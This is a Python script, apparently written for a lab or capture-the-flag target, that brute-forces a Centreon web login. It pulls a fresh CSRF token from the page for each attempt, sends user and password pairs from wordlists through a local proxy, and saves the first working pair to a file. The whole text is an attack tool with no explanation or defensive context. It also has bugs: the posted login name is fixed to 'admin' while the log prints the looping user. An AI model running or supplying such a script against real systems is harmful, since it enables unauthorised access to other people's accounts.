import os,sys 
from sys import argv
from bs4 import BeautifulSoup as Soup
import requests

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy
            }


scripts, userlist, passwordlist = argv

if len(sys.argv) != 3:
        sys.stderr.write('Usage: ' + sys.argv[0]+ ' userlist passwordlist\n')
        sys.exit(1)

if not os.path.exists(userlist):
        sys.stderr.write('userlist was not found\n')
        sys.exit(1)

if not os.path.exists(passwordlist):
        sys.stderr.write('passwordlist was not found\n')
        sys.exit(1)

else:
        print("Loading your lists...")
        userfile = open(userlist, "r")
        users = userfile.read().split("\n")
        userfile.close()

		
        passfile = open(passwordlist, "r")
        passwords = passfile.read().split("\n")
        passfile.close()

        for user in users:
            for password in passwords:
                
                url1 = "http://10.10.10.10/index.php"

                cookies = dict(PHPSESSID='same_cookies')
                response = requests.get(url1,proxies=proxyDict, cookies=cookies)

                html = response.text
                soup =Soup(html)
                csrf_token = soup.findAll(attrs={"name" : "centreon_token"})[0].get('value')  
                print ("Trying "+user +" : " + password + " with csrf token : "+ csrf_token)


                data = {'useralias' : 'admin', 'password'  : password, 'submitLogin' : 'Connect', 'centreon_token' : csrf_token }

                url = "http://10.10.10.10/index.php" 

                html = requests.post(url1, proxies=proxyDict, cookies=cookies, data=data)

                if "Your credentials are incorrect" not in html.text:
                    print("Login : Password are  " + user + " : " + password)
                    pas = open('done.txt','a')
                    pas.write('%s : %s \n' %(user,password))
                    pas.close()
                    
                    sys.exit(1)
